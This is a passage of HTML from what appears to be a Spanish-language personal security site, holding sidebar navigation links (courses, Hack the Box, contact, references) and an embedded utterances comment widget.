</a>
            
<a href="./cursos.html">
<div class="option">
<i class="fas fa-video" title="Cursos"></i>
<h4>Cursos</h4>
</div>
</a>

<a href="./hackthebox.html">
<div class="option">
<i class="far fa-sticky-note" title="Hack the Box"></i>
<h4>HTB</h4>
</div>
</a>

<a href="./contacto.html">
<div class="option">
<i class="far fa-id-badge" title="Contacto"></i>
<h4>Contacto</h4>
</div>
</a>

<a href="./referencias.html">
<div class="option">
<i class="far fa-address-card" title="Referencias"></i>
<h4>Referencias</h4>
</div>
</a>

</div>

</div>

<script src="../js/script.js"></script>  <!-- Archivo Java para el menú lateral responsive -->
</body>

<!-------------------------------------  Gestor de Comentrarios  ---------------------------------->

<html lang="en">
  <div id="comentarios">
    <body>
      <script src="https://utteranc.es/client.js" repo="F1r0x/gestion-comentarios" issue-term="pathname" theme="github-light" crossorigin="anonymous" async="">
      </script>         
    </body>
  </div>
</html>

<!-------------------------------------------------------------------------------------------------->

    </div>
</html>
<hr />

<!------------------------------------------------------------------------------------------------->
<!------------------------------------------------------------------------------------------------->